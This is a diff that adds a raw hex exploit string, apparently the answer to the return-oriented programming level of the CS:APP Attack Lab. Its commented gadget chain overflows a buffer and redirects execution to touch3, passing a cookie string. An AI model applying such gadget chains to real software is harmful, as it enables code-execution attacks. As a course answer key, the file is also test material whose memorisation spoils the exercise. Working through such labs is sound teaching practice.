@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 空字符 */
+ad 1a 40 00 00 00 00 00 /* 溢出 -> mov %rsp, %rax ret setval_350 */
+c5 19 40 00 00 00 00 00 /* mov %rax, %rdi ret setval_426 */
+ab 19 40 00 00 00 00 00 /* popq %rax ret addval_219 */
+48 00 00 00 00 00 00 00 /* 立即数0x48 */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx ret getval_481 */
+69 1a 40 00 00 00 00 00 /* movl %edx, %ecx ret getval_311 */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %esi ret addval_436 */
+d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1), %rax ret add_xy */
+c5 19 40 00 00 00 00 00 /* mov %rax, %rdi ret setval_426 */
+fa 18 40 00 00 00 00 00 /* touch3 entrance */
+35 39 62 39 39 37 66 61 00 /* 59b997fa\0 */
